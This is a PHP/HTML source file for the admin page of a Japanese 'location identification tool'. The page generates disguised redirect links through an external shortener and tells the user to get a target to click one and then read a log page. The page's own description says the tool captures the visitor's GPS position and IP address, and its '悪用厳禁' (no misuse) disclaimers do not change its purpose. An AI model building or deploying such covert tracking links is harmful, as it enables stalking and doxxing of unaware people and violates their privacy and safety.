<?php require_once(dirname(__FILE__)."/../PLEASEEDIT.php"); ?>
﻿<!DOCTYPE html>
<html lang="ja" itemscope="" itemtype="http://schema.org/WebPage" dir="ltr">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no">
    <meta name="keywords" content="住所,特定,IP特定,IPアドレス,住所特定,特定ツール,ツール,GPS,悪用厳禁,ActiveTK">
    <title>位置情報特定ツール</title>
    <meta name="author" content="ActiveTK.">
    <meta name="robots" content="All">
    <meta name="favicon" content="https://www.activetk.cf/icon/index_32_32.ico">
    <meta http-equiv="Content-Style-Type" content="text/css">
    <meta http-equiv="Content-Script-Type" content="text/javascript">
    <meta name="description" content="位置情報特定ツールです。GPS情報やIPアドレスを取得する事が出来ます。やり方は簡単、特定したい相手にリンクをクリックさせるだけ！悪用厳禁!!">
    <meta name="copyright" content="Copyright &copy; 2021 ActiveTK. All rights reserved.">
    <meta name="thumbnail" content="https://www.activetk.cf/icon/index.jpg">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:site" content="@ActiveTK5929">
    <meta name="twitter:creator" content="@ActiveTK5929">
    <meta name="twitter:title" content="位置情報特定ツール">
    <meta name="twitter:description" content="位置情報特定ツールです。GPS情報やIPアドレスを取得する事が出来ます。やり方は簡単、特定したい相手にリンクをクリックさせるだけ！悪用厳禁!!">
    <meta name="twitter:image:src" content="https://www.activetk.cf/icon/index.jpg">
    <meta property="og:title" content="位置情報特定ツール">
    <meta property="og:description" content="位置情報特定ツールです。GPS情報やIPアドレスを取得する事が出来ます。やり方は簡単、特定したい相手にリンクをクリックさせるだけ！悪用厳禁!!">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://redirect.activetk.cf/admin/">
    <meta property="og:site_name" content="位置情報特定ツール">
    <meta property="og:locale" content="ja_JP">
    <meta property="og:image" content="https://www.activetk.cf/icon/index.jpg">
    <meta property="og:image:width" content="1280">
    <meta property="og:image:height" content="720">
    <link rel="shortcut icon" href="https://www.activetk.cf/icon/index_16_16.ico" sizes="16x16">
    <link rel="shortcut icon" href="https://www.activetk.cf/icon/index_32_32.ico" sizes="32x32">
    <link rel="shortcut icon" href="https://www.activetk.cf/icon/index_64_64.ico" sizes="64x64">
    <link rel="shortcut icon" href="https://www.activetk.cf/icon/index_192_192.ico" sizes="192x192">
    <link rel="apple-touch-icon-precomposed" href="https://www.activetk.cf/icon/index_150_150.ico">
    <script>function copy(e){let t=document.createElement("div");t.appendChild(document.createElement("pre")).textContent=e;let n=t.style;n.position="fixed",n.left="-100%",document.body.appendChild(t),document.getSelection().selectAllChildren(t);let o=document.execCommand("copy");return document.body.removeChild(t),o}</script>
    <style>a{color: #00ff00;position: relative;display: inline-block;transition: .3s;}a::after {position: absolute;bottom: 0;left: 50%;content: '';width: 0;height: 2px;background-color: #31aae2;transition: .3s;transform: translateX(-50%);}a:hover::after{width: 100%;}</style>
  </head>
  <body style="background-color:#000000;color:#ffffff;">
    <noscript>
      <div title="NO SCRIPT ERROR" style="background-color:#404ff0;" align="center">
        <font color="#ff4500"><h1>No JavaScript Error.</h1></font>
      </div>
    </noscript>
    <div align="center">
      <h3>位置情報特定ツール <a href="https://twitter.com/intent/tweet?text=%E4%BD%8D%E7%BD%AE%E6%83%85%E5%A0%B1%E7%89%B9%E5%AE%9A%E3%83%84%E3%83%BC%E3%83%AB%0A&hashtags=ActiveTK%2C%E4%BD%8F%E6%89%80%E7%89%B9%E5%AE%9A%2C%E4%BD%8F%E6%89%80%E7%89%B9%E5%AE%9A%E3%83%84%E3%83%BC%E3%83%AB&url=<?=sk?>://<?=root?><?=path?>admin/" target="_blank" rel="noopener noreferrer"><img src="./Tweet.jpg" width="25"></a></h3>
      <div style="background-color:#0f5474;">
        <form action='' method='POST'>
          <input type='text' name='info' placeholder='リダイレクト先のURLを入力してください' size='42' required>
          <input type="submit" value="リンクを作成">
        </form>
        <?php
        if(isset($_POST['info']) && $_POST['info'] != "")
        {
	  $flg = rand(1, 10000000);
          $aitenourl = file_get_contents("https://rinu.cf/?addurlbyphp=".rawurlencode(sk."://".root.path)."%3Furl%3D" . rawurlencode(rawurlencode($_POST['info'])) . "%26flg%3D" . htmlspecialchars($flg) . "&makefrom=" . $_SERVER['REMOTE_ADDR']);
        ?>
	    <h4><font color="#ffd700">使用方法</font></h4>
        1 <font style="background-color:#228b22;"><a href="../license.php" target="_blank" rel="noopener noreferrer">[利用規約]</a></font>に全て同意してください。(悪用対策)<br>
        2. 相手を <a href="<?=$aitenourl?>" target="_blank" rel="noopener noreferrer"><font style="background-color:#228b22;">[ここ]</font></a> にアクセスさせます。<input value='URLをコピー' type='button' onclick='copy("<?=$aitenourl?>");alert("コピーしました!");'><br>
        3. <font style="background-color:#228b22;"><a href="../log/<?=$flg?>.html" target="_blank" rel="noopener noreferrer">[ここ]</a></font>にアクセスします。<br>
        <br>
        <h4><font color="#00ff00">悪用厳禁！自己責任です！</font></h4>
	    <?php } ?>
      </div>
    </div>
    <div align="left" style="position:fixed;bottom:0px;left:5px;"><a href="https://www.activetk.cf/" target="_blank">ホーム</a></font></div>
    <div align="right" style="position:fixed;bottom:0px;right:0px;"><font style="background-color:#06f5f3;color:#000000;"><?php
    function is_android () {
      if (!preg_match('/'.implode('|', array('Android')).'/i', $_SERVER['HTTP_USER_AGENT'])) return "no";
      else return "yes";
    }
    function is_iphone () {
      if (!preg_match('/'.implode('|', array('iPhone')).'/i', $_SERVER['HTTP_USER_AGENT'])) return "no";
      else return "yes";
    }
    function is_winphone () {
      if (!preg_match('/'.implode('|', array('Windows Phone')).'/i', $_SERVER['HTTP_USER_AGENT'])) return "no";
      else return "yes";
    }
    if (is_android() == "no" && is_iphone() == "no" && is_winphone() == "no")
      echo "Copyright &copy; 2021 <a href='https://www.youtube.com/channel/UCVB-GPAdPTWascT4WiKWhDQ' target='_blank'><span style='color:#000000;'>ActiveTK.</span></a> All rights reserved.";
    else
      echo "&copy <a href='https://www.youtube.com/channel/UCVB-GPAdPTWascT4WiKWhDQ' target='_blank'><span style='color:#000000;'>ActiveTK.</span></span></a>";
    ?></font></div>
  </body>
</html>